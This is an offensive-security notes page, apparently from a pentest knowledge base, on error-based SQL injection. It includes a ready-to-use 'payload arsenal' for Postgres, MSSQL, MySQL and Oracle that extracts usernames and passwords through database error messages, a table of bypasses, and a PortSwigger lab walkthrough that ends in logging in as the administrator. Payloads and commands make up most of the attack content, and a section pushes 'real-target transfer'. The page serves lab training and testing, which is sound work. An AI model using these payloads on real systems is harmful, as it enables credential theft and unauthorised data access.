# SQL injection - Error-based (verbose error data extraction)

When the app leaks DB error text into the response, you can force errors whose message *contains the data you want* - turning a blind injection into a visible one without UNION. Max impact: read arbitrary values (creds/PII) directly out of error strings, even when results aren't rendered.

## Quick reference

```
'                                   -> verbose error? It often prints the full query + context
'--                                 -> comment tail, fix the unclosed quote
' AND 1=CAST((SELECT 1) AS int)--   -> prove CAST path (type-error channel)
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   -> leak value in the error
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--   -> leak password
```

Decision list:
- Error text echoes your input / the SQL query -> injection context handed to you on a plate.
- Cast a string subquery to `int` -> the DB prints the offending string in the type error -> that's your data.
- "more than one row" error -> add `LIMIT 1`. "must be boolean" -> wrap in `1=CAST(...)`.

## Root cause
Database errors propagate to the HTTP response (debug mode, default error pages, unsanitized error handling). Type-conversion functions (`CAST`/`CONVERT`/`EXTRACTVALUE`) embed a queried value inside the error message.

## Find it (recon and detection)
- Inject `'`; if you get a message like `Unterminated string literal ... in SQL SELECT * FROM tracking WHERE id = '''`, the app is verbose - it just told you the exact query and your injection context.
- Confirm you can fix syntax (`'--`) and then deliberately trigger a *data-bearing* error.

## Technique
1. **Map the context** from the verbose `'` error (single-quoted string in a WHERE, etc.).
2. **Comment the tail:** `'--` so your added syntax is valid.
3. **Open the CAST channel:** `' AND 1=CAST((SELECT 1) AS int)--`. If you get "argument of AND must be boolean", wrap with a comparison (`1=CAST(...)`) - done above.
4. **Leak data:** replace the inner SELECT with the target: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`. Casting a varchar to int fails with `invalid input syntax for type integer: "administrator"` - the value is in the quotes.
5. **Handle multi-row:** add `LIMIT 1` (Postgres/MySQL) / `WHERE ROWNUM=1` (Oracle) / `TOP 1` (MSSQL) to avoid "more than one row" errors.
6. **Handle char limits:** if the cookie/param truncates, delete its original value to free bytes so your `--` survives.

**Advanced / DB-specific error leak primitives:**
- **Postgres:** `CAST((SELECT password FROM users LIMIT 1) AS int)` -> `invalid input syntax for integer: "secret"`.
- **MSSQL:** `SELECT 'foo' WHERE 1=(SELECT 'secret')` -> `Conversion failed when converting the varchar value 'secret' to data type int`. Also `CONVERT(int,(SELECT @@version))`.
- **MySQL (no implicit cast error):** use XPath functions - `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))` -> `XPATH syntax error: '\secret'`; or `UPDATEXML(1,CONCAT(0x7e,(SELECT ...)),1)`. Double-query: `... AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT ...),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`.
- **Oracle:** `CTXSYS.DRITHSX.SN(1,(SELECT ...))` or `TO_CHAR` errors; XML `XMLType((SELECT ...))`.
- Error messages typically cap at ~30-200 chars -> chunk long values with `SUBSTRING`.

## Payload arsenal
```sql
-- Postgres
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
' WHERE 1=(SELECT TOP 1 password FROM users)--
-- MySQL (XPath error channel)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)-- -
-- Oracle
' AND 1=(SELECT UTL_INADDR.get_host_name((SELECT password FROM users WHERE ROWNUM=1)))--
-- chunk long values
' AND 1=CAST((SELECT SUBSTRING(password,1,20) FROM users LIMIT 1) AS int)--
```

## Bypasses
| Blocker | Bypass |
|---|---|
| "more than one row" | `LIMIT 1` / `TOP 1` / `WHERE ROWNUM=1` |
| "AND must be boolean" | wrap: `1=CAST((...) AS int)` |
| char/length limit | delete original cookie value; chunk with `SUBSTRING` |
| MySQL no cast error | `EXTRACTVALUE`/`UPDATEXML`/double-query XPath trick |
| errors suppressed | not error-based - go blind (`../Blind-time-based/`, `../Out-of-band-OAST/`) |

## Exploitation walkthrough (Postgres, TrackingId cookie)
1. `TrackingId=...'` -> verbose error prints the full query and shows you're in a single-quoted string.
2. `TrackingId=...'--` -> error gone (valid query).
3. `...' AND 1=CAST((SELECT 1) AS int)--` -> "AND must be boolean" -> already comparison-wrapped, so this is valid; tweak until clean.
4. `...' AND 1=CAST((SELECT username FROM users) AS int)--` -> truncation hides the `--`; **delete the original TrackingId value** to free chars: `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`.
5. Error: `invalid input syntax for type integer: "administrator"` -> first user is admin.
6. `...(SELECT password FROM users LIMIT 1)...` -> error leaks the admin password. Log in -> solved.

## Chaining
- Leaked creds -> [Authentication](../../Authentication/) / account takeover.
- Same verbose-error surface often leaks stack traces / paths -> [Information-disclosure](../../Information-disclosure/).

## Tools
- **Burp Repeater:** iterate the CAST payload; read the error body each send.
- **sqlmap:** `--technique=E` automates error-based extraction across DB-specific channels.

## Labs

### Lab: Visible error-based SQL injection [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
- Method: `TrackingId` cookie. `'` -> verbose error reveals the query. `'--` fixes it. `' AND 1=CAST((SELECT 1) AS int)--` opens the channel; char-limit forces deleting the original cookie value. `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` leaks `administrator`; swap to `password` to leak the secret; log in.
- Insight: casting a string subquery to int makes the DB print the string in the type error. `LIMIT 1` defeats "more than one row"; trimming the cookie defeats truncation.
- Real-target transfer: any endpoint that echoes DB errors - a single quote that prints the query is a goldmine; pivot straight to CAST extraction.

## Real-world notes
- Verbose DB errors are common in misconfigured prod (debug left on, default framework error pages).
- Report both the injection AND the verbose-error info disclosure.
- CVSS: data extraction -> High-Critical. Even without extraction, leaking the full query/schema is a meaningful info-disclosure finding.

## References
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet
